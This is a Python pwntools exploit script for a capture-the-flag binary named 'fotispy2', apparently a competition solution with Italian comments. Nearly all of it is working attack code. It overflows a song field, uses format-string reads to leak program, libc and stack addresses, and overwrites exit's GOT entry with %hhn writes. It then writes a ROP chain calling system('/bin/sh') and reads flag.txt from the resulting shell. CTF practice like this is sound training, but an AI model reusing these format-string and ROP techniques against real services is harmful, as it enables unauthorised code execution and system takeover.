#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("./fotispy2_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

URL = ''
PORT = 0


def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'aa; db sym.imp.exit; dc; Vpp' -d " + str(io.pid)

        subprocess.Popen(
            [
                "x-terminal-emulator",                  # open systen default terminal emulator
                "-e",
                os.environ.get("SHELL", "/bin/sh"),    # execute default shell
                "-c",
                r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote" + str(host) + str(port_val))
        return remote(host, port_val)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)


io = start()
line = b': '


def login(username=b'a', password=b'a'):
    io.sendlineafter(line, b'1')
    io.sendlineafter(line, username)
    io.sendlineafter(line, password)


def register(username=b'a', password=b'a'):
    io.sendlineafter(line, b'0')
    io.sendlineafter(line, username)
    io.sendlineafter(line, password)


def ovewrflow_song():
    io.sendlineafter(line, b'2')
    io.sendlineafter(line, b'b' * 1279)  # song name
    io.sendlineafter(line, b'c' * 1279)  # song artist
    io.sendafter(line, b'd' * 32)  # song album


def save_song(payload):
    io.sendlineafter(line, b'2')
    io.sendlineafter(line, payload)  # song name
    io.sendlineafter(line, b'c')  # song artist
    io.sendlineafter(line, b'd')  # song album


def get_leak():
    io.sendlineafter(line, b'3')
    io.recvuntil(b'[~] Your favorites:\n')
    data = io.recvline().split(b' - ')[2]
    return data


# flow iniziale: register, login, overflow per ottenere leak
register()
login()
ovewrflow_song()


# get main address leak
main_leak_offset = 11
fmstr = f"%{main_leak_offset}$p".ljust(16, 'a').encode()
save_song(fmstr)
data = get_leak()
main_leak = int(data[-25:-11].decode(), 16)
main_addr = main_leak - 241

exe.address = main_addr - 0x001018f4
printf_got = exe.address + 0x00104020
exit_got = exe.address + 0x00104050

success(f"main @ {hex(main_addr)}")
success(f"exe base {hex(exe.address)}")
success(f'printf got @ {hex(printf_got)}')
success(f'exit got @ {hex(exit_got)}')
my_offset = 342

fmstr = f"%{my_offset}$s".ljust(16, 'a').encode() + p64(printf_got)
save_song(fmstr)
raw_data = get_leak()[32:].split(b'aaaaaaaaaa')[0]

libc_leak = u64(raw_data.ljust(8, b'\x00'))
success(f"libc printf @ {hex(libc_leak)}")

libc.address = libc_leak - libc.sym['printf']

binsh = libc.address + 0x00196031
pop_rdi = libc.address + 0x00000000000277e5
ret = libc.address + 0x0000000000026e99

one_gadget = libc.address + 0x4c139
success(f"one_gadget @ {hex(one_gadget)}")


fmstr = f"%{my_offset}$s".ljust(16, 'a').encode() + p64(libc.sym['environ'])
save_song(fmstr)
raw_data = get_leak()[32:].split(b'aaaaaaaaaa')[0]

stack_leak = u64(raw_data.ljust(8, b'\x00'))
success(f"libc environ  {hex(stack_leak)}")


def byte_write(where, what):
    for i in range(len(what)):
        b = what[i] - 0x20 if what[i] != 0 else 0x100 - 0x20
        fmstr = f"%{b}c%{my_offset}$hhn".ljust(16, 'a').encode()
        save_song(fmstr + p64(where + i))
        get_leak()
        info(f"written {i+1} of {len(what)}")


pop_4_times = libc.address + 0x00000000000277de
byte_write(exit_got, p64(pop_4_times))

gag = stack_leak - 417168
success(f"writing @ {hex(gag)}")

'''
return_address = stack_leak - 417200 - 0x20
warning(f"writing shellcode @ {hex(return_address)}")
'''

payload = flat([
    pop_rdi, binsh,
    ret,
    libc.sym['system']
])
byte_write(gag, payload)

io.sendlineafter(line, b'4')


io.sendline(b"cat flag.txt")
# replace the brackets with the one of your chall
data = io.recvregex(rb'ENO\{.*\}', capture=True)
flag = data.group(0).decode()
success('Flag: ' + flag)
write('flag.txt', flag)
io.close()



